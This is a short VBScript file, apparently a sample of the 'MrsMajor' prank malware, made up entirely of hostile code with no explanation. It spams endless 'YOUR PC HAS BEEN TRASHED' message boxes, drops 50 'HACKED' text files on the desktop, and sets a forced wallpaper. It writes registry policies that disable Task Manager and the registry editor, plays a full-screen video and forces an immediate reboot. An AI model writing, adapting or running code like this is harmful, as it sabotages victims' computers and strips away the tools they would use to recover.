do
  MsgBox "YOUR PC HAS BEEN TRASHED",9569,"YOUR PC HAS BEEN TRASHED"
loop

set x = createobject("Wscript.shell")
set c = createobject("Scripting.filesystemobject")
set objShell=createobject("Shell.Application")
on error resume next

dim tmp : tmp=x.expandenvironmentstrings("%TEMP%")
dim dsk : dsk=x.specialfolders("DESKTOP")
dim ke : ke="C:\Program Files\mrsmajor"
c.CopyFile""&ke&"\def_resource\t.jpg", ""&tmp&"\"






if c.fileexists(""&ke&"\Doll_patch.xml") then
else
c.CreateTextFile""&ke&"\Doll_patch.xml"
for nexfil=1 to 50
    set p=c.CreateTextFile(""&dsk&"\"&nexfil&"HACKED.txt")
    p.write"HAHAHHAHHAHHAHAH HACKED"
p.close
next
  x.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system\wallpaper",""&tmp&"\t.jpg","REG_SZ"

x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
x.run "wmplayer.exe """&ke&"\def_resource\f11.mp4"""
wscript.sleep 3500
x.sendkeys"{F11}"
wscript.sleep 5000
x.run "shutdown.exe -r -t 03",0
msgbox"MrsMajor Wants TO MEET YOU!",1+48,"Cute Doll!"
wscript.quit
end if

